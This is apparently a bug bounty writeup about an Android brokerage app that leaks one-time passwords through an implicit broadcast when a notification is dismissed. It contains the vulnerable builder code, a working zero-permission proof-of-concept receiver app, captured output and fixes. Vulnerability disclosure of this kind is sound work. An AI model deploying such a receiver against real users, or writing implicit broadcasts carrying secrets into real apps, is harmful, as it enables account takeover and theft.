# Swipe-to-Leak

- **Source URL:** https://medium.com/@husein.ayoub/swipe-to-leak-otp-theft-via-an-implicit-broadcast-on-notification-dismiss-51e9ab7f3718
- **Fetched from:** https://medium.com/@husein.ayoub/swipe-to-leak-otp-theft-via-an-implicit-broadcast-on-notification-dismiss-51e9ab7f3718?source=rss-66c1c114eefc------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14926 (id 14926)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Hussein Ayoub / Sun, 27 Sep 2026 18:59:17 GMT

*How dismissing a push notification let any zero-permission app on the device read the OTP inside it. No root, no accessibility service, no user interaction beyond a swipe the user makes anyway.*

Some Android bugs need a clever chain. This one needs a gesture the user performs a dozen times a day: swiping a notification away.

This is a writeup of a vulnerability I reported to a private program on a bug bounty platform in a widely installed Android brokerage app. The app pushes one-time passwords over push notifications. When the user dismisses one of those notifications, the app broadcasts the entire notification payload, OTP included, as an implicit intent that every installed app can read.

If you have hunted Android for a while, the shape of this will feel familiar:

The first is normal. The second is the bug. Put them together and the notification’s own dismiss action becomes an exfiltration channel.

When an app posts a notification it can attach two PendingIntents:

The delete intent is how apps learn “the user swiped this away” so they can update state, log analytics, or cancel a re-alert. Perfectly legitimate.

The danger is in how that intent gets built. If it is an explicit intent (it targets a specific component inside your own app) or it carries a receiver permission, only you can receive it. If it is an implicit intent, just an action string, Android delivers it to any registered receiver on the device.

The app is a popular brokerage and trading app on the Play Store. The kind that handles real accounts and real money, and gates sensitive operations like web login, withdrawals, and trades behind an OTP delivered by push. That context is what turns a notification content leak from an information-disclosure footnote into a straight path to account takeover.

Same pipeline as always. Pull the APK, decompile with jadx (for readable Java) and apktool (for the manifest and resources), then run an LLM-assisted review pass over the decompiled output to flag suspicious sinks before I read anything by hand. For notification bugs, the sinks worth surfacing are cheap to describe:

The pass flagged the push notification provider right away: two PendingIntents per notification, one explicit, one not.

Reconstructed and de-obfuscated, the notification builder does something equivalent to this. Notice the asymmetry between the two intents:

// TAP intent, done correctly (explicit, targets our own Activity)

Intent tapIntent = new Intent(context, MainActivity.class);

tapIntent.setAction("notification\_opened");

tapIntent.putExtra("id", push.id);

tapIntent.putExtra("type", push.type);

tapIntent.putExtra("title", push.title);

tapIntent.putExtra("body", push.body); // contains the OTP

PendingIntent tapPi = PendingIntent.getActivity(

context, reqCode, tapIntent, FLAG\_IMMUTABLE);

// DISMISS intent, the bug (implicit, no target, no permission)

Intent dismissIntent = new Intent();

dismissIntent.setAction("notification\_deleted"); // action only

dismissIntent.putExtra("id", push.id);

dismissIntent.putExtra("type", push.type);

dismissIntent.putExtra("title", push.title);

dismissIntent.putExtra("body", push.body); // OTP, again

PendingIntent dismissPi = PendingIntent.getBroadcast(

context, reqCode, dismissIntent, FLAG\_IMMUTABLE);

builder.setContentIntent(tapPi)

.setDeleteIntent(dismissPi); // fires as an IMPLICIT broadcast on swipe

The tap path is textbook. It is an explicit intent that can only ever land inside the app’s own MainActivity. The dismiss path copies the same extras, OTP body included, into an intent that names only an action string. No setPackage(), no setComponent(), and no permission on the broadcast.

So when the user swipes the notification, Android fires notification\_deleted as an implicit broadcast and delivers it to every app that registered a receiver for that action.

FLAG\_IMMUTABLE on the PendingIntent does not help here. Immutability stops a third party from mutating the intent's fields, not from receiving the broadcast and reading its extras.

The malicious app is about as minimal as an Android app gets. Its manifest declares zero \<uses-permission> entries. The only component is a launcher activity:

\<manifest xmlns:android="http://schemas.android.com/apk/res/android"

package="com.poc.broadcastleak">

\<uses-sdk android:minSdkVersion="24" android:targetSdkVersion="33" />

\<application android:label="BroadcastLeakPoC">

\<activity android:name=".MainActivity" android:exported="true">

\<intent-filter>

\<action android:name="android.intent.action.MAIN" />

\<category android:name="android.intent.category.LAUNCHER" />

\</intent-filter>

\</activity>

\</application>

\</manifest>

At runtime it registers a receiver for the vulnerable action and dumps whatever extras arrive:

```
public class MainActivity extends Activity {
    private static final String TAG = "OTP_LEAK_POC";
```
```
    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override public void onReceive(Context ctx, Intent intent) {
            Log.w(TAG, "=== BROADCAST RECEIVED === " + intent.getAction());
            Bundle extras = intent.getExtras();
            if (extras != null) {
                for (String key : extras.keySet()) {
                    Log.w(TAG, key + " = " + extras.get(key));   // OTP lands here
                }
            }
        }
    };
```
```
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        // ...
        registerReceiver(receiver, new IntentFilter("notification_deleted"));
    }
}
```
That is the whole exploit. A runtime registerReceiver with an IntentFilter on the action string. No special manifest declaration is even required. In the wild you would register it from a background component and ship the captured body straight to a collector instead of a TextView.

One thing worth calling out: a real attacker does not need the target app foregrounded, does not need to know when an OTP will arrive, and does not race anyone. The receiver just sits there. Every dismissed notification, OTP or otherwise, walks right into it.

Or watch it from the shell:

adb logcat -s OTP\_LEAK\_POC

The intercepted broadcast (values here are from my test push; the real ones carry the live OTP):

=== BROADCAST RECEIVED === notification\_deleted

id = \<redacted>

type = Otp

title = \<verification-code notification title>

body = Your OTP code is 482916

pushSource = \<push provider>

type = Otp is the tell. The app itself labels the payload as an OTP, then hands it to anyone listening.

The receiving app needs no permissions, no root, no accessibility service, and no interaction from the victim beyond the dismiss gesture they already perform reflexively.

**Confidentiality (high)**

**Account takeover (the real one)**

The severity here is not “an app can read notifications.” That normally needs BIND\_NOTIFICATION\_LISTENER\_SERVICE and an explicit user grant in Settings. This bug routes around that entire consent model by pushing the data out as an unprotected broadcast.

Two clean options, pick either.

Make the dismiss intent explicit, mirroring what the tap intent already does:

Intent dismissIntent = new Intent(context, PushDismissReceiver.class); // your own receiver

dismissIntent.setAction("notification\_deleted");

PendingIntent dismissPi = PendingIntent.getBroadcast(

context, reqCode, dismissIntent, FLAG\_IMMUTABLE);

Or gate it with a signature-level permission, so only your own app can receive it:

\<permission android:name="com.vendor.app.RECEIVE\_PUSH\_EVENTS"

android:protectionLevel="signature" />

PendingIntent.getBroadcast(context, reqCode, dismissIntent,

FLAG\_IMMUTABLE); // paired with sendBroadcast(intent, RECEIVE\_PUSH\_EVENTS)

Defense in depth on top of either one:

The tap intent and the dismiss intent were written by the same person, in the same method, seconds apart. One explicit, one not. That asymmetry is the whole bug. When you audit notification code, do not stop at the content intent. The delete intent is the one people forget, and it fires on the most reflexive gesture on the platform.

**Disclosure timeline**

29/Aug/26 -> Reported

22/Sep/26 -> Accepted and bounty awarded
